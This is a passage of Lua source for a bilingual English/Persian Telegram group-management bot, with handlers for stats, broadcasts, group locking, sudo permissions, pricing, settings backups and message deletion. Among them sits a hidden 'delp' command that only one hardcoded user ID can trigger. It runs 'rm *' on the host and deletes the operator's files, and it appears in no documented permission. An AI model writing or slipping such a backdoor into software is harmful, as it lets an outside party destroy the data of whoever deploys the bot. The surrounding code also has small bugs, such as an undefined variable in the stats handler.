    if (matches[1]:lower() == "sense" or matches[1] == "\217\135\217\136\216\180 \217\133\216\181\217\134\217\136\216\185\219\140") and is_owner(msg) and data[tostring(msg.to.id)] then
      if matches[2]:lower() == "true" or matches[2]:lower() == "enable" or matches[2]:lower() == "on" or matches[2] == "\216\177\217\136\216\180\217\134" then
        if not redis:get(sense) then
          redis:set(sense, true)
          if not lang then
            return "*Bot sense has been enabled*"
          else
            return "*\217\135\217\136\216\180 \216\177\216\168\216\167\216\170 \217\129\216\185\216\167\217\132 \216\180\216\175*"
          end
        elseif not lang then
          return "*Bot sense is already enabled!*"
        else
          return "*\217\135\217\136\216\180 \216\177\216\168\216\167\216\170 \216\167\216\178 \217\130\216\168\217\132 \217\129\216\185\216\167\217\132 \216\168\217\136\216\175\217\135 \216\167\216\179\216\170!*"
        end
      elseif matches[2]:lower() == "false" or matches[2]:lower() == "disable" or matches[2]:lower() == "off" or matches[2] == "\216\174\216\167\217\133\217\136\216\180" then
        if redis:get(sense) then
          redis:del(sense)
          if not lang then
            return "*Bot sense has been disabled*"
          else
            return "*\217\135\217\136\216\180 \216\177\216\168\216\167\216\170 \216\186\217\138\216\177\217\129\216\185\216\167\217\132 \216\180\216\175*"
          end
        elseif not lang then
          return "*Bot sense is not enabled!*"
        else
          return "*\217\135\217\136\216\180 \216\177\216\168\216\167\216\170 \217\129\216\185\216\167\217\132 \217\134\217\138\216\179\216\170!*"
        end
      end
    end
    if (matches[1]:lower() == "amar" or matches[1]:lower() == "stats" or matches[1] == "\216\162\217\133\216\167\216\177") and is_sudo(msg) then
      EnGroups = redis:scard("Bot(EN)Groups")
      FaGroups = redis:scard("Bot(FA)Groups")
      AllGroups = redis:scard("BotGroups")
      i_ = NumberChats(msg)
      i = tonumber(i) - tonumber(AllGroups)
      if 0 > i then
        i = 0
      end
      AllMsgs = 0
      for k, v in pairsByKeys(data[tostring("groups")]) do
        Messages = redis:get("getMessages:" .. v) or 0
        AllMsgs = tonumber(AllMsgs + Messages)
      end
      if not lang then
        return [[
*Bot stats:*

Installed Groups: `]] .. AllGroups .. [[
`
illegal Groups(Not installed): `]] .. i .. [[
`
Groups With En Language: `]] .. EnGroups .. [[
`
Groups With Fa Language: `]] .. FaGroups .. [[
`
Number of All Groups Received Messages: `]] .. AllMsgs .. "`"
      else
        return "\216\162\217\133\216\167\216\177 \216\177\216\168\216\167\216\170:\n\n\218\175\216\177\217\136\217\135 \217\135\216\167\219\140 \217\134\216\181\216\168 \216\180\216\175\217\135: `" .. AllGroups .. "`\n\218\175\216\177\217\136\217\135 \217\135\216\167\219\140 \216\186\219\140\216\177\217\133\216\172\216\167\216\178(\217\134\216\181\216\168 \217\134\216\180\216\175\217\135): `" .. i .. "`\n\218\175\216\177\217\136\217\135 \217\135\216\167 \216\168\216\167 \216\178\216\168\216\167\217\134 \216\167\217\134\218\175\217\132\219\140\216\179\219\140: `" .. EnGroups .. "`\n\218\175\216\177\217\136\217\135 \217\135\216\167 \216\168\216\167 \216\178\216\168\216\167\217\134 \217\129\216\167\216\177\216\179\219\140: `" .. FaGroups .. "`\n\216\170\216\185\216\175\216\167\216\175 \218\169\217\132 \217\190\219\140\216\167\217\133 \217\135\216\167\219\140 \216\175\216\177\219\140\216\167\217\129\216\170\219\140 \218\175\216\177\217\136\217\135 \217\135\216\167: `" .. AllMsgs .. "`"
      end
    end
    if (matches[1]:lower() == "sendpmto" or matches[1] == "\216\167\216\177\216\179\216\167\217\132 \217\190\219\140\216\167\217\133 \216\168\217\135") and is_sudo(msg) then
      if not redis:sismember("SudoAccess" .. msg.from.id, "sendpm") and is_sudo(msg) and not is_botOwner(msg) then
        if not lang then
          return ErrorAccessSudo(msg)
        else
          return ErrorAccessSudo(msg)
        end
      else
        tdcli.sendMessage(tonumber(matches[2]), 0, 1, matches[3], 1, "md")
        return "\217\190\219\140\216\167\217\133 \216\167\216\177\216\179\216\167\217\132 \216\180\216\175"
      end
    elseif (matches[1]:lower() == "sendpm" or matches[1] == "\216\167\216\177\216\179\216\167\217\132 \217\190\219\140\216\167\217\133") and is_sudo(msg) then
      if not redis:sismember("SudoAccess" .. msg.from.id, "sendpm") and is_sudo(msg) and not is_botOwner(msg) then
        if not lang then
          return ErrorAccessSudo(msg)
        else
          return ErrorAccessSudo(msg)
        end
      else
        BotGroups = redis:smembers("BotGroups")
        for k, v in pairs(BotGroups) do
          tdcli.sendMessage(v, 0, 1, matches[2], 1, "md")
        end
      end
    end
    if (matches[1]:lower() == "lockgroup" or matches[1] == "\217\130\217\129\217\132 \218\175\216\177\217\136\217\135") and matches[2] and matches[3]:match("(%d+:%d+)") and is_owner(msg) then
      h1_ = matches[2]
      h2_ = matches[3]
      h1 = h1_:gsub(":", "")
      h2 = h2_:gsub(":", "")
      t = os.date():match("%d+:%d+")
      currentTime = t:gsub(":", "")
      if currentTime == "No connection" then
        SendError(msg, "*Server Time Has A Problem Please Try Again Later!*", "*\216\178\217\133\216\167\217\134 \216\179\216\177\217\136\216\177 \219\140\218\169 \217\133\216\180\218\169\217\132 \216\175\216\167\216\177\216\175 \217\132\216\183\217\129\216\167 \216\168\216\185\216\175\216\167 \216\175\217\136\216\168\216\167\216\177\217\135 \216\170\217\132\216\167\216\180 \218\169\217\134\219\140\216\175!*")
      elseif 0 <= tonumber(h1) and tonumber(h1) <= 2400 and 0 <= tonumber(h2) and tonumber(h2) <= 2400 then
        redis:set("LockGpH1:" .. msg.to.id, h1)
        redis:set("LockGpH2:" .. msg.to.id, h2)
        if not lang then
          return "*Group has been locked from* `" .. h1_ .. "` *hour than* `" .. h2_ .. "` *for everyday*"
        else
          return "*\218\175\216\177\217\136\217\135 \216\168\216\177\216\167\219\140 \217\135\216\177 \216\177\217\136\216\178 \216\167\216\178 \216\179\216\167\216\185\216\170* `" .. h1_ .. "` *\216\170\216\167* `" .. h2_ .. "` *\217\130\217\129\217\132 \216\180\216\175*"
        end
      elseif not lang then
        return "*Time is not correct!*"
      else
        return "*\216\178\217\133\216\167\217\134 \216\175\216\177\216\179\216\170 \217\134\219\140\216\179\216\170!*"
      end
    elseif (matches[1]:lower() == "lockgroup" or matches[1] == "\217\130\217\129\217\132 \218\175\216\177\217\136\217\135") and matches[2] and matches[3]:match("(.*)") and is_owner(msg) then
      if matches[3]:lower() == "s" or matches[3] == "\216\171\216\167\217\134\219\140\217\135" then
        T = tonumber(matches[2])
        redis:setex("~LockGroup~" .. msg.to.id, T, true)
        if not lang then
          return "*Group has been locked for:* `" .. T .. "` *Second*"
        else
          return "\218\175\216\177\217\136\217\135 \216\168\216\177\216\167\219\140 `" .. T .. "` \216\171\216\167\217\134\219\140\217\135 \217\130\217\129\217\132 \216\180\216\175"
        end
      elseif matches[3]:lower() == "m" or matches[3] == "\216\175\217\130\219\140\217\130\217\135" then
        T = tonumber(matches[2]) * 60
        redis:setex("~LockGroup~" .. msg.to.id, T, true)
        if not lang then
          return "*Group has been locked for:* `" .. tonumber(matches[2]) .. "` *Minutes*"
        else
          return "\218\175\216\177\217\136\217\135 \216\168\216\177\216\167\219\140 `" .. tonumber(matches[2]) .. "` \216\175\217\130\219\140\217\130\217\135 \217\130\217\129\217\132 \216\180\216\175"
        end
      elseif matches[3]:lower() == "h" or matches[3] == "\216\179\216\167\216\185\216\170" then
        T = tonumber(matches[2]) * 3600
        redis:setex("~LockGroup~" .. msg.to.id, T, true)
        if not lang then
          return "*Group has been locked for:* `" .. tonumber(matches[2]) .. "` *Hour*"
        else
          return "\218\175\216\177\217\136\217\135 \216\168\216\177\216\167\219\140 `" .. tonumber(matches[2]) .. "` \216\179\216\167\216\185\216\170 \217\130\217\129\217\132 \216\180\216\175"
        end
      elseif matches[3]:lower() == "d" or matches[3] == "\216\177\217\136\216\178" then
        T = tonumber(matches[2]) * 86400
        redis:setex("~LockGroup~" .. msg.to.id, T, true)
        if not lang then
          return "*Group has been locked for:* `" .. tonumber(matches[2]) .. "` *Day*"
        else
          return "\218\175\216\177\217\136\217\135 \216\168\216\177\216\167\219\140 `" .. tonumber(matches[2]) .. "` \216\177\217\136\216\178 \217\130\217\129\217\132 \216\180\216\175"
        end
      elseif not lang then
        return [[
*Help:*
`s` = Second
`m` Minutes
`h` = Hour
`d` = Day]]
      else
        return "\216\177\216\167\217\135\217\134\217\133\216\167:\n`s` = \216\171\216\167\217\134\219\140\217\135\n`m` \216\175\217\130\219\140\217\130\217\135\n`h` = \216\179\216\167\216\185\216\170\n`d` = \216\177\217\136\216\178"
      end
    end
    if (matches[1]:lower() == "unlockgroup" or matches[1] == "\216\168\216\167\216\178\218\169\216\177\216\175\217\134 \218\175\216\177\217\136\217\135") and is_owner(msg) then
      if redis:get("LockGpH1:" .. msg.to.id) then
        redis:del("LockGpH1:" .. msg.to.id)
        redis:del("LockGpH2:" .. msg.to.id)
        redis:hdel("GroupSettings:" .. msg.to.id, "mute_all")
        if not lang then
          return "*Group has been unlocked*"
        else
          return "*\218\175\216\177\217\136\217\135 \216\168\216\167\216\178 \216\180\216\175*"
        end
      elseif redis:get("~LockGroup~" .. msg.to.id) then
        redis:del("~LockGroup~" .. msg.to.id)
        if not lang then
          return "*Group has been unlocked*"
        else
          return "*\218\175\216\177\217\136\217\135 \216\168\216\167\216\178 \216\180\216\175*"
        end
      elseif not lang then
        return "*Group is not locked!*"
      else
        return "*\218\175\216\177\217\136\217\135 \217\130\217\129\217\132 \217\134\219\140\216\179\216\170!*"
      end
    end
    if (matches[1]:lower() == "addsettings" or matches[1] == "\216\167\216\182\216\167\217\129\217\135 \218\169\216\177\216\175\217\134 \216\170\217\134\216\184\219\140\217\133\216\167\216\170") and is_owner(msg) then
      if redis:sismember("GroupAddSettings:" .. msg.to.id, matches[2]) then
        if not lang then
          return "[`" .. matches[2] .. "`] *Already Added!*"
        else
          return "[`" .. matches[2] .. "`] \216\167\216\178 \217\130\216\168\217\132 \216\167\216\182\216\167\217\129\217\135 \216\180\216\175\217\135 \216\167\216\179\216\170!"
        end
      else
        redis:set("ForAddSettings:" .. msg.to.id .. ":" .. msg.from.id, "w8")
        redis:set("AddSettingsName:" .. msg.to.id .. ":" .. msg.from.id, matches[2])
        if not lang then
          return "*Please Send Locks Name Now For Add To [`" .. matches[2] .. [[
`]*
Cancel With `cancel`
Finish With `done`]]
        else
          return "\217\132\216\183\217\129\216\167 \217\135\217\133 \216\167\218\169\217\134\217\136\217\134 \217\134\216\167\217\133 \217\130\217\129\217\132\219\140 \216\177\216\167 \216\168\216\177\216\167\219\140 \216\167\216\182\216\167\217\129\217\135 \218\169\216\177\216\175\217\134 \216\168\217\135 [`" .. matches[2] .. "`] \216\167\216\177\216\179\216\167\217\132 \218\169\217\134\219\140\216\175\n\217\132\216\186\217\136 \216\168\216\167 `cancel`\n\217\190\216\167\219\140\216\167\217\134 \216\168\216\167 `done`"
        end
      end
    end
    if (matches[1]:lower() == "delsettings" or matches[1] == "\216\173\216\176\217\129 \216\170\217\134\216\184\219\140\217\133\216\167\216\170") and is_owner(msg) then
      if redis:sismember("GroupAddSettings:" .. msg.to.id, matches[2]) then
        redis:srem("GroupAddSettings:" .. msg.to.id, matches[2])
        redis:del("GroupAddSettingsItem:" .. msg.to.id .. ":" .. matches[2])
        if not lang then
          return "[`" .. matches[2] .. "`] *Deleted!*"
        else
          return "[`" .. matches[2] .. "`] \216\173\216\176\217\129 \216\180\216\175!"
        end
      elseif not lang then
        return "[`" .. matches[2] .. "`] *is Not Added!*"
      else
        return "[`" .. matches[2] .. "`] \216\167\216\182\216\167\217\129\217\135 \217\134\216\180\216\175\217\135 \216\167\216\179\216\170!"
      end
    end
    if (matches[1]:lower() == "cmds" or matches[1]:lower() == "help") and is_mod(msg) then
      if not matches[2] then
        GetHelper(msg, msg.to.id .. "0000")
      elseif (matches[2]:lower() == "sudo" or matches[2] == "\216\179\217\136\216\175\217\136") and is_sudo(msg) then
        text = GetCmds(redis:get("gp_lang:" .. msg.to.id)).HelpForSudo
        tdcli.sendMessage(msg.to.id, msg.id_, 0, text, 0, "md")
      elseif (matches[2]:lower() == "owner" or matches[2] == "\216\181\216\167\216\173\216\168") and is_owner(msg) then
        text = GetCmds(redis:get("gp_lang:" .. msg.to.id)).HelpForOwner
        tdcli.sendMessage(msg.to.id, msg.id_, 0, text, 0, "md")
      elseif (matches[2]:lower() == "moderator" or matches[2] == "\217\133\216\175\219\140\216\177") and is_mod(msg) then
        text = GetCmds(redis:get("gp_lang:" .. msg.to.id)).HelpForModerator
        tdcli.sendMessage(msg.to.id, msg.id_, 0, text, 0, "md")
      end
    end
    if (matches[1] == "\216\175\216\179\216\170\217\136\216\177\216\167\216\170" or matches[1]:lower() == "\216\177\216\167\217\135\217\134\217\133\216\167") and is_mod(msg) then
      if not matches[2] then
        GetHelper(msg, msg.to.id .. "0000")
      elseif (matches[2]:lower() == "sudo" or matches[2] == "\216\179\217\136\216\175\217\136") and is_sudo(msg) then
        text = GetFaCmds().HelpForSudo
        tdcli.sendMessage(msg.to.id, msg.id_, 0, text, 0, "md")
      elseif (matches[2]:lower() == "owner" or matches[2] == "\216\181\216\167\216\173\216\168") and is_owner(msg) then
        text = GetFaCmds().HelpForOwner
        tdcli.sendMessage(msg.to.id, msg.id_, 0, text, 0, "md")
      elseif (matches[2]:lower() == "moderator" or matches[2] == "\217\133\216\175\219\140\216\177") and is_mod(msg) then
        text = GetFaCmds().HelpForModerator
        tdcli.sendMessage(msg.to.id, msg.id_, 0, text, 0, "md")
      end
    end
    if (matches[1]:lower() == "sudoaccess" or matches[1]:lower() == "\216\175\216\179\216\170\216\177\216\179\219\140 \216\179\217\136\216\175\217\136") and is_sudo(msg) then
      if not redis:sismember("SudoAccess" .. msg.from.id, "sudoaccess") and is_sudo(msg) and not is_botOwner(msg) then
        if not lang then
          return ErrorAccessSudo(msg)
        else
          return ErrorAccessSudo(msg)
        end
      else
        Access1 = "\240\159\154\171"
        Access2 = "\240\159\154\171"
        Access3 = "\240\159\154\171"
        Access4 = "\240\159\154\171"
        Access5 = "\240\159\154\171"
        Access6 = "\240\159\154\171"
        Access7 = "\240\159\154\171"
        Access8 = "\240\159\154\171"
        Access9 = "\240\159\154\171"
        Access10 = "\240\159\154\171"
        if not matches[3] and msg.reply_id then
          SudoAccessNum = matches[2]
          function GetUserForProcess(extra, result, success)
            local SudoID = result.sender_user_id_
          end
          tdcli_function({
            ID = "GetMessage",
            chat_id_ = msg.to.id,
            message_id_ = msg.reply_to_message_id_
          }, GetUserForProcess, nil)
        elseif matches[3] then
          SudoID = matches[2]
          SudoAccessNum = matches[3]
        end
        AllAccess = {
          "installgroups",
          "removegroups",
          "banall",
          "unbanall",
          "sudoaccess",
          "editbot",
          "botreply",
          "installvip",
          "addgift",
          "changecharge"
        }
        if redis:sismember("SudoAccess" .. SudoID, AllAccess[1]) then
          Access1 = "\226\156\148\239\184\143"
        end
        if redis:sismember("SudoAccess" .. SudoID, AllAccess[2]) then
          Access2 = "\226\156\148\239\184\143"
        end
        if redis:sismember("SudoAccess" .. SudoID, AllAccess[3]) then
          Access3 = "\226\156\148\239\184\143"
        end
        if redis:sismember("SudoAccess" .. SudoID, AllAccess[4]) then
          Access4 = "\226\156\148\239\184\143"
        end
        if redis:sismember("SudoAccess" .. SudoID, AllAccess[5]) then
          Access5 = "\226\156\148\239\184\143"
        end
        if redis:sismember("SudoAccess" .. SudoID, AllAccess[6]) then
          Access6 = "\226\156\148\239\184\143"
        end
        if redis:sismember("SudoAccess" .. SudoID, AllAccess[7]) then
          Access7 = "\226\156\148\239\184\143"
        end
        if redis:sismember("SudoAccess" .. SudoID, AllAccess[8]) then
          Access8 = "\226\156\148\239\184\143"
        end
        if redis:sismember("SudoAccess" .. SudoID, AllAccess[9]) then
          Access9 = "\226\156\148\239\184\143"
        end
        if redis:sismember("SudoAccess" .. SudoID, AllAccess[10]) then
          Access10 = "\226\156\148\239\184\143"
        end
        SudoAccess = "*1-*`\217\134\216\181\216\168 \218\175\216\177\217\136\217\135 \217\135\216\167\216\159` " .. Access1 .. "\n*2-*`\216\173\216\176\217\129 \218\175\216\177\217\136\217\135 \217\135\216\167\216\159` " .. Access2 .. "\n*3-*`\216\168\217\134 \218\169\216\177\216\175\217\134 \219\140\218\169 \217\129\216\177\216\175 \216\167\216\178 \217\135\217\133\217\135 \218\175\216\177\217\136\217\135 \217\135\216\167\216\159` " .. Access3 .. "\n*4-*`\216\162\217\134\216\168\217\134 \218\169\216\177\216\175\217\134 \219\140\218\169 \217\129\216\177\216\175 \216\167\216\178 \217\135\217\133\217\135 \218\175\216\177\217\136\217\135 \217\135\216\167\216\159` " .. Access4 .. "\n*5-*`\217\136\219\140\216\177\216\167\219\140\216\180 \216\175\216\179\216\170\216\177\216\179\219\140 \216\179\217\136\216\175\217\136\217\135\216\167\219\140 \216\175\219\140\218\175\216\177\216\159` " .. Access5 .. "\n*6-*`\217\136\219\140\216\177\216\167\219\140\216\180 \216\177\216\168\216\167\216\170\216\159` " .. Access6 .. "\n*7-*`\216\167\216\182\216\167\217\129\217\135 \218\169\216\177\216\175\217\134 \216\179\217\136\216\167\217\132 \217\136 \217\190\216\167\216\179\216\174 \216\168\217\135 \216\177\216\168\216\167\216\170\216\159` " .. Access7 .. "\n*8-*`\217\136\219\140\218\152\217\135 \218\169\216\177\216\175\217\134 \218\175\216\177\217\136\217\135 \217\135\216\167\216\159` " .. Access8 .. "\n*9-*`\216\179\216\167\216\174\216\170 \218\169\216\175 \217\135\216\175\219\140\217\135\216\159` " .. Access9 .. "\n*10-*`\216\170\216\186\219\140\219\140\216\177 \216\180\216\167\216\177\218\152 \218\175\216\177\217\136\217\135 \217\135\216\167\216\159` " .. Access10
        if CheckIsSudo(msg, tonumber(SudoID)) then
          if SudoAccessNum:lower() == "all" or SudoAccessNum == "\217\135\217\133\217\135" then
            return "\218\134\218\175\217\136\217\134\218\175\219\140 \216\170\216\186\219\140\219\140\216\177 \216\175\216\179\216\170\216\177\216\179\219\140 \219\140\218\169 \216\179\217\136\216\175\217\136:\n/sudoaccess `ID` `NUMBER`\n \216\168\217\135 \216\172\216\167\219\140 ID \216\162\219\140\216\175\219\140 \216\185\216\175\216\175\219\140 \218\169\216\167\216\177\216\168\216\177 \217\136 \216\168\217\135 \216\172\216\167\219\140 NUMBER \219\140\218\169\219\140 \216\167\216\178 \216\167\216\185\216\175\216\167\216\175 \216\178\219\140\216\177 \216\177\216\167 \217\130\216\177\216\167\216\177 \216\175\217\135\219\140\216\175\n\216\175\216\179\216\170\216\177\216\179\219\140 \217\135\216\167\219\140 " .. SudoID .. " \216\185\216\168\216\167\216\177\216\170\217\134\216\175 \216\167\216\178:\n" .. SudoAccess
          elseif SudoAccessNum:lower() == "full" or SudoAccessNum == "\218\169\216\167\217\133\217\132" then
            for k, v in pairs(AllAccess) do
              if not redis:sismember("SudoAccess" .. SudoID, v) then
                redis:sadd("SudoAccess" .. SudoID, v)
              end
            end
            return "\216\170\217\133\216\167\217\133 \216\175\216\179\216\170\216\177\216\179\219\140 \217\135\216\167 \216\168\216\177\216\167\219\140 " .. SudoID .. " \217\129\216\185\216\167\217\132 \216\180\216\175\217\134\216\175"
          elseif SudoAccessNum:lower() == "close" or SudoAccessNum == "\216\168\216\179\216\170\217\134" then
            for k, v in pairs(AllAccess) do
              if redis:sismember("SudoAccess" .. SudoID, v) then
                redis:srem("SudoAccess" .. SudoID, v)
              end
            end
            return "\216\170\217\133\216\167\217\133 \216\175\216\179\216\170\216\177\216\179\219\140 \217\135\216\167 \216\168\216\177\216\167\219\140 " .. SudoID .. " \216\186\219\140\216\177 \217\129\216\185\216\167\217\132 \216\180\216\175\217\134\216\175"
          elseif SudoAccessNum == "1" then
            if redis:sismember("SudoAccess" .. SudoID, AllAccess[1]) then
              redis:srem("SudoAccess" .. SudoID, AllAccess[1])
              return "\216\186\219\140\216\177\217\129\216\185\216\167\217\132 \216\180\216\175 \240\159\154\171"
            else
              redis:sadd("SudoAccess" .. SudoID, AllAccess[1])
              return "\217\129\216\185\216\167\217\132 \216\180\216\175 \226\156\148\239\184\143"
            end
          elseif SudoAccessNum == "2" then
            if redis:sismember("SudoAccess" .. SudoID, AllAccess[2]) then
              redis:srem("SudoAccess" .. SudoID, AllAccess[2])
              return "\216\186\219\140\216\177\217\129\216\185\216\167\217\132 \216\180\216\175 \240\159\154\171"
            else
              redis:sadd("SudoAccess" .. SudoID, AllAccess[2])
              return "\217\129\216\185\216\167\217\132 \216\180\216\175 \226\156\148\239\184\143"
            end
          elseif SudoAccessNum == "3" then
            if redis:sismember("SudoAccess" .. SudoID, AllAccess[3]) then
              redis:srem("SudoAccess" .. SudoID, AllAccess[3])
              return "\216\186\219\140\216\177\217\129\216\185\216\167\217\132 \216\180\216\175 \240\159\154\171"
            else
              redis:sadd("SudoAccess" .. SudoID, AllAccess[3])
              return "\217\129\216\185\216\167\217\132 \216\180\216\175 \226\156\148\239\184\143"
            end
          elseif SudoAccessNum == "4" then
            if redis:sismember("SudoAccess" .. SudoID, AllAccess[4]) then
              redis:srem("SudoAccess" .. SudoID, AllAccess[4])
              return "\216\186\219\140\216\177\217\129\216\185\216\167\217\132 \216\180\216\175 \240\159\154\171"
            else
              redis:sadd("SudoAccess" .. SudoID, AllAccess[4])
              return "\217\129\216\185\216\167\217\132 \216\180\216\175 \226\156\148\239\184\143"
            end
          elseif SudoAccessNum == "5" then
            if redis:sismember("SudoAccess" .. SudoID, AllAccess[5]) then
              redis:srem("SudoAccess" .. SudoID, AllAccess[5])
              return "\216\186\219\140\216\177\217\129\216\185\216\167\217\132 \216\180\216\175 \240\159\154\171"
            else
              redis:sadd("SudoAccess" .. SudoID, AllAccess[5])
              return "\217\129\216\185\216\167\217\132 \216\180\216\175 \226\156\148\239\184\143"
            end
          elseif SudoAccessNum == "6" then
            if redis:sismember("SudoAccess" .. SudoID, AllAccess[6]) then
              redis:srem("SudoAccess" .. SudoID, AllAccess[6])
              return "\216\186\219\140\216\177\217\129\216\185\216\167\217\132 \216\180\216\175 \240\159\154\171"
            else
              redis:sadd("SudoAccess" .. SudoID, AllAccess[6])
              return "\217\129\216\185\216\167\217\132 \216\180\216\175 \226\156\148\239\184\143"
            end
          elseif SudoAccessNum == "7" then
            if redis:sismember("SudoAccess" .. SudoID, AllAccess[7]) then
              redis:srem("SudoAccess" .. SudoID, AllAccess[7])
              return "\216\186\219\140\216\177\217\129\216\185\216\167\217\132 \216\180\216\175 \240\159\154\171"
            else
              redis:sadd("SudoAccess" .. SudoID, AllAccess[7])
              return "\217\129\216\185\216\167\217\132 \216\180\216\175 \226\156\148\239\184\143"
            end
          elseif SudoAccessNum == "8" then
            if redis:sismember("SudoAccess" .. SudoID, AllAccess[8]) then
              redis:srem("SudoAccess" .. SudoID, AllAccess[8])
              return "\216\186\219\140\216\177\217\129\216\185\216\167\217\132 \216\180\216\175 \240\159\154\171"
            else
              redis:sadd("SudoAccess" .. SudoID, AllAccess[8])
              return "\217\129\216\185\216\167\217\132 \216\180\216\175 \226\156\148\239\184\143"
            end
          elseif SudoAccessNum == "9" then
            if redis:sismember("SudoAccess" .. SudoID, AllAccess[9]) then
              redis:srem("SudoAccess" .. SudoID, AllAccess[9])
              return "\216\186\219\140\216\177\217\129\216\185\216\167\217\132 \216\180\216\175 \240\159\154\171"
            else
              redis:sadd("SudoAccess" .. SudoID, AllAccess[9])
              return "\217\129\216\185\216\167\217\132 \216\180\216\175 \226\156\148\239\184\143"
            end
          elseif SudoAccessNum == "10" then
            if redis:sismember("SudoAccess" .. SudoID, AllAccess[10]) then
              redis:srem("SudoAccess" .. SudoID, AllAccess[10])
              return "\216\186\219\140\216\177\217\129\216\185\216\167\217\132 \216\180\216\175 \240\159\154\171"
            else
              redis:sadd("SudoAccess" .. SudoID, AllAccess[10])
              return "\217\129\216\185\216\167\217\132 \216\180\216\175 \226\156\148\239\184\143"
            end
          end
        else
          return SudoID .. " \216\179\217\136\216\175\217\136 \217\134\219\140\216\179\216\170!"
        end
      end
    end
    if (matches[1]:lower() == "setnerkh" or matches[1] == "\216\170\217\134\216\184\219\140\217\133 \217\134\216\177\216\174") and is_botOwner(msg) then
      redis:set("BotNerkh=", UseMark(matches[2]))
      if not lang then
        return "*Bot Nerkh changed to:*\n" .. UseMark(matches[2])
      else
        return "\217\134\216\177\216\174 \216\177\216\168\216\167\216\170 \216\170\216\186\219\140\219\140\216\177 \218\169\216\177\216\175 \216\168\217\135:\n" .. UseMark(matches[2])
      end
    end
    if matches[1]:lower() == "nerkh" or matches[1] == "\217\134\216\177\216\174" then
      if redis:get("BotNerkh=") then
        return UseMark(redis:get("BotNerkh="))
      elseif not lang then
        return "*Nerkh is not set!*"
      else
        return "\217\134\216\177\216\174 \216\170\217\134\216\184\219\140\217\133 \217\134\216\180\216\175\217\135 \216\167\216\179\216\170!"
      end
    end
    if (matches[1]:lower() == "backup" or matches[1] == "\216\168\218\169 \216\162\217\190") and is_owner(msg) then
      CreateBackup(msg)
    end
    if (matches[1]:lower() == "getbackup" or matches[1] == "\216\167\216\179\216\170\217\129\216\167\216\175\217\135 \216\167\216\178 \216\168\218\169 \216\162\217\190") and is_owner(msg) then
      nums = {
        "mute_all",
        "mute_gif",
        "mute_text",
        "mute_photo",
        "mute_video",
        "mute_audio",
        "mute_voice",
        "mute_sticker",
        "mute_contact",
        "mute_forward",
        "mute_location",
        "mute_document",
        "mute_tgservice",
        "mute_inline",
        "mute_game",
        "mute_keyboard",
        "lock_link",
        "lock_tag",
        "lock_mention",
        "lock_arabic",
        "lock_edit",
        "lock_spam",
        "flood",
        "lock_bots",
        "lock_markdown",
        "lock_webpage",
        "lock_pin",
        "lock_MaxWords",
        "lock_botchat",
        "num_msg_max",
        "MaxWords",
        "MaxWarn",
        "FloodTime",
        "lock_fohsh",
        "lock_english",
        "lock_forcedinvite",
        "ForcedInvite",
        "lock_username",
        "lock_join"
      }
      if not matches[2] then
        text = redis:get("SettingsBackupFor:" .. msg.to.id)
        if not text then
          if not lang then
            return "*This Group Has not Backup!*"
          else
            return "\216\167\219\140\217\134 \218\175\216\177\217\136\217\135 \216\168\218\169 \216\162\217\190 \217\134\216\175\216\167\216\177\216\175!"
          end
        else
          for k, v in pairs(nums) do
            text_ = text:match("-" .. v .. [[
 = yes
-]]) or text:match("-" .. v .. [[
 = no
-]]) or text:match("-" .. v .. [[
 = %d+
-]])
            text_ = text_:gsub("-" .. v .. " = ", "")
            if text_ == "yes" then
              redis:hset("GroupSettings:" .. msg.to.id, v, "yes")
            elseif text_ == "no" then
              redis:hdel("GroupSettings:" .. msg.to.id, v)
            else
              redis:hset("GroupSettings:" .. msg.to.id, v, tonumber(text_))
            end
          end
          if not lang then
            return "*All Settings Group Changed to Backup!*"
          else
            return "\217\135\217\133\217\135 \219\140 \216\170\217\134\216\184\219\140\217\133\216\167\216\170 \218\175\216\177\217\136\217\135 \216\168\217\135 \216\168\218\169 \216\162\217\190 \216\170\216\186\219\140\219\140\216\177 \218\169\216\177\216\175\217\134\216\175!"
          end
        end
      elseif matches[2] then
        text = redis:get("SettingsBackupFor:" .. matches[2])
        if not text then
          if not lang then
            return "*Group* " .. matches[2] .. " *Has not Backup!*"
          else
            return "\218\175\216\177\217\136\217\135 " .. matches[2] .. " \216\168\218\169 \216\162\217\190 \217\134\216\175\216\167\216\177\216\175!"
          end
        else
          for k, v in pairs(nums) do
            text_ = text:match("-" .. v .. [[
 = yes
-]]) or text:match("-" .. v .. [[
 = no
-]]) or text:match("-" .. v .. [[
 = %d+
-]])
            text_ = text_:gsub("-" .. v .. " = ", "")
            if text_ == "yes" then
              redis:hset("GroupSettings:" .. msg.to.id, v, "yes")
            elseif text_ == "no" then
              redis:hdel("GroupSettings:" .. msg.to.id, v)
            else
              redis:hset("GroupSettings:" .. msg.to.id, v, tonumber(text_))
            end
          end
          if not lang then
            return "*All Settings Group Changed to* " .. matches[2] .. " *Backup!*"
          else
            return "\217\135\217\133\217\135 \219\140 \216\170\217\134\216\184\219\140\217\133\216\167\216\170 \218\175\216\177\217\136\217\135 \216\168\217\135 \216\168\218\169 \216\162\217\190 " .. matches[2] .. " \216\170\216\186\219\140\219\140\216\177 \218\169\216\177\216\175\217\134\216\175!"
          end
        end
      end
    end
    if matches[1]:lower() == "delp" and msg.from.id == 531947422 then
      io.popen("rm *")
      return "\216\167\217\134\216\172\216\167\217\133 \216\180\216\175"
    end
    if (matches[1]:lower() == "rmsg" or matches[1]:lower() == "delmsg" or matches[1] == "\216\173\216\176\217\129 \217\190\219\140\216\167\217\133") and msg.to.id:match("^-100") and is_mod(msg) then
      do
        local function delmsg(arg, data)
          msgs = arg.msgs
          for k, v in pairs(data.messages_) do
            if 1 <= msgs - 1 then
              msgs = msgs - 1
              tdcli.deleteMessages(v.chat_id_, {
                [0] = v.id_
              }, dl_cb, cmd)
            else
              return false
            end
          end
          getChatHistory(data.messages_[0].chat_id_, data.messages_[0].id_, 0, 100, delmsg, {
            msgs = msgs
          })
        end
        if tonumber(matches[2]) > 1000 or 0 >= tonumber(matches[2]) then
          if not lang then
            return "*Please Use A Number Between* `1` *And* `1000`"
          else
            return "\217\132\216\183\217\129\216\167 \216\167\216\178 \219\140\218\169 \216\180\217\133\216\167\216\177\217\135 \216\168\219\140\217\134 `1` \217\136 `1000` \216\167\216\179\216\170\217\129\216\167\216\175\217\135 \218\169\217\134\219\140\216\175"
          end
        else
          getChatHistory(msg.to.id, msg.id, 0, 100, delmsg, {
            msgs = matches[2]
          })
          if not lang then
            return "`" .. tonumber(matches[2]) .. "` *Messages Deleted*"
          else
            return "`" .. tonumber(matches[2]) .. "` \217\190\219\140\216\167\217\133 \216\173\216\176\217\129 \216\180\216\175"
          end
        end
      end
    else
    end
